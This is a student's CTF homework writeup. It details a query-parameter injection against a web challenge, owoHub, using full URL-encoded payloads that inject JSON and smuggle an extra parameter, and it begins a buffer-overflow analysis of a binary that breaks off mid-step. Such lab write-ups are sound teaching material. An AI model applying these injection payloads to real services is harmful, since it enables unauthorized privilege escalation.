# Computer Security Fall 2020 HW0 writeup

## Web - owoHub
> FLAG{owo_ch1wawa_15_th3_b35t_uwu!!!}

1. Check *source code*
   - how to get flag?
   ```js
   // but the function can't be directly access by external users
   if (givemeflag === "yes" && userInfo.admin) response.send(FLAG);
   ```
   - where can be used?
      > `app.get('/auth', (request, response) => { const { username, cute } = request.query;`
      a. only check that `cute` end with `true` or `false`
      ```js
      if (typeof username !== "string" || typeof cute !== "string" || username === "" || !cute.match("(true|false)$"))
      ```
      b. `userInfo` take `cute` from the request query directly
      ```js
      const userInfo = `{"username":"${username}","admin":false,"cute":${cute}}`;
      ```
      c. use `userInfo` define in the previous step in the url and be used to `GET` **internally**
      ```js
      const api = `http://127.0.0.1:9487/?data=${userInfo}&givemeflag=no`;
      ```
2. give a random `username` and `cute`
   `https://owohub.zoolab.org/auth?username=a&cute=true`
3. make `admin` to be true
   `https://owohub.zoolab.org/auth?username=a&cute=true,%22admin%22:true`
   - since `userInfo` is `{"username":"${username}","admin":false,"cute":${cute}}`, by injecting `cute` previous key/value pair `"admin":false`
   - make `cute` to be `true,"admin":true`, `userInfo` will then be `{"username":"a","admin":false,"cute":true}`. That is, `{"username":"a","admin":true,"cute":false}`
4. make `givemeflag` to be `"yes"`
   1. want something like this, `https://owohub.zoolab.org/auth?username=a&cute=true,"admin":true}&givemeflag=yes#true`
      > `}` close the bracket for `useInfo` which make all the things after it not a part of `userInfo`  
      > `#` point a browser to a specific part or page but all characters after `#` will not be sent in request  
      - make `api` to be `http://127.0.0.1:9487/?data={"username":"a","admin":true,"cute":false}&givemeflag=yes#true&givemeflag=no`
      - the actual request being send internally should be `http://127.0.0.1:9487/?data={"username":"a","admin":true,"cute":false}&givemeflag=yes`
   2. try and get `{"error":"Whaaaat owo?"}`
      - currently, `cute` is `false,"admin":true}` so that it doesn't end with `true` or `false`
      - `cute` only take the part before the next `&`
   3. *url encoding* to bypass it
      > find the correspoding encode for `"}&#`  
      - then, the url should be `https://owohub.zoolab.org/auth?username=a&cute=true,%22admin%22:true%7D%26givemeflag=yes%23true`

## pwn - Cafe Overflow
> flag{c0ffee_0verfl0win6_from_k3ttle_QAQ}

1. disassemble the binary with `objdump -d -M intel CafeOverflow`
```nasm
  401234:	e8 17 fe ff ff       	call   401050 <printf@plt>
  401239:	48 8d 45 f0          	lea    rax,[rbp-0x10]
  40123d:	48 89 c6             	mov    rsi,rax
  401240:	48 8d 3d f6 0d 00 00 	lea    rdi,[rip+0xdf6]        # 40203d <_IO_stdin_used+0x3d>
  401247:	b8 00 00 00 00       	mov    eax,0x0
  40124c:	e8 1f fe ff ff       	call   401070 <__isoc99_scanf@plt>
```
Use `scanf` to get input in the *main function* with a buffer size of `0x10`. Therefore, it's vulnerable to **buffer overflow**. By 
2. 